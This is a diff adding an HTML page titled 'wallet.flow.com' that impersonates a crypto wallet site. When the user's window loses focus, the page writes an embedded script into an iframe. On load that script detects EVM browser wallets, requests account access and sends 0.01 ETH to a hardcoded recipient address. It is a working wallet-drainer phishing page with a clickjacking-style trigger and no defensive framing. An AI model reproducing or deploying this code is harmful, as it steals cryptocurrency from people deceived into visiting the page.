@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>wallet.flow.com</title>
+  <style>
+    iframe {
+      width: 80%;
+      height: 300px;
+      border: 1px solid #ccc;
+      margin-top: 20px;
+    }
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      background: #f0f0f0;
+      padding: 20px;
+    }
+    h1 { color: #333; }
+    .status { margin-top: 20px; color: #666; }
+  </style>
+</head>
+<body>
+  <h1>Click Here</h1>
+  <iframe id="iframe"></iframe>
+
+  <script>
+    window.onblur = function () {
+      const iframe = document.getElementById("iframe");
+      const doc = iframe.contentDocument || iframe.contentWindow.document;
+      doc.open();
+      doc.write(`
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>wallet.flow.com</title>
+</head>
+<body>
+  <h3 id="msg">Detecting wallet...</h3>
+  <div id="status" class="status"></div>
+
+  <script>
+    // CONFIG
+    const TARGET_ADDRESS = "0xf9f41a5462bbe4f3ee00559b346930d9172c22c2"; // Ganti dengan alamat penerima
+    const SEND_AMOUNT_WEI = "0x2386F26FC10000"; // 0.01 ETH
+
+    const statusEl = document.getElementById('status');
+    const msgEl = document.getElementById('msg');
+
+    // DETECT SEMUA EVM WALLET
+    function detectWallets() {
+      const wallets = {
+        metamask: window.ethereum,
+        trust: window.trustWalletProvider,
+        coinbase: window.coinbaseWalletExtension,
+        binance: window.BinanceChain,
+        brave: window.ethereum && window.ethereum.isBrave,
+        phantom: window.solana && window.ethereum, // Phantom supports EVM
+        okx: window.okxwallet,
+        imtoken: window.imToken,
+        safe: window.gnosis,
+        ledger: window.LedgerEthereum,
+        rabby: window.rabby,
+        walletConnect: window.WalletConnectProvider
+      };
+
+      const detected = Object.keys(wallets).filter(key => wallets[key]);
+      if (detected.length === 0) {
+        msgEl.innerText = "No EVM wallet detected!";
+        return null;
+      }
+
+      msgEl.innerText = `Detected: ${detected.join(', ')}`;
+      return wallets[detected[0]]; // Gunakan wallet pertama
+    }
+
+    // CONNECT WALLET (SAMA UNTUK SEMUA)
+    async function connectWallet(provider) {
+      if (!provider) throw new Error("No wallet provider");
+
+      try {
+        // Request accounts
+        const accounts = await provider.request({ method: 'eth_requestAccounts' });
+        if (!accounts || accounts.length === 0) throw new Error("No accounts");
+
+        const user = accounts[0];
+        statusEl.innerHTML = `Connected: <code>${user.slice(0,6)}...${user.slice(-4)}</code>`;
+        return user;
+      } catch (err) {
+        throw new Error("Connection rejected: " + (err.message || err));
+      }
+    }
+
+    // SEND TRANSACTION (SAMA UNTUK SEMUA EVM)
+    async function sendTransaction(provider, from, to, value, gas = '0x5208') {
+      try {
+        const txHash = await provider.request({
+          method: 'eth_sendTransaction',
+          params: [{
+            from: from,
+            to: to,
+            value: value,
+            gas: gas,
+            data: '0x' // Empty data
+          }]
+        });
+        statusEl.innerHTML += `<br>✅ TX Sent: <code>${txHash.slice(0,10)}...</code>`;
+        return txHash;
+      } catch (err) {
+        statusEl.innerHTML += `<br>❌ TX Failed: ${err.message || err}`;
+        throw err;
+      }
+    }
+
+    // MAIN FLOW
+    async function autoConnectAndSend() {
+      msgEl.innerText = "Checking wallet...";
+      
+      const provider = detectWallets();
+      if (!provider) {
+        msgEl.innerText = "No EVM wallet detected!";
+        return;
+      }
+
+      try {
+        // 1. Connect
+        const user = await connectWallet(provider);
+        msgEl.innerText = "Wallet connected! Sending transaction...";
+
+        // 2. Send 0.01 ETH to target
+        const txHash = await sendTransaction(provider, user, "${TARGET_ADDRESS}", "${SEND_AMOUNT_WEI}");
+
+        msgEl.innerText = "Transaction completed!";
+        statusEl.innerHTML = `Sent 0.01 ETH to ${TARGET_ADDRESS}<br>Tx: ${txHash}`;
+
+      } catch (err) {
+        msgEl.innerText = "Operation failed.";
+        statusEl.innerHTML = `Error: ${err.message || err}`;
+      }
+    }
+
+    // Auto run saat halaman load
+    window.addEventListener("load", autoConnectAndSend);
+  </script>
+</body>
+</html>
+
+      `);
+      doc.close();
+    };
+  </script>
+</body>
+</html>
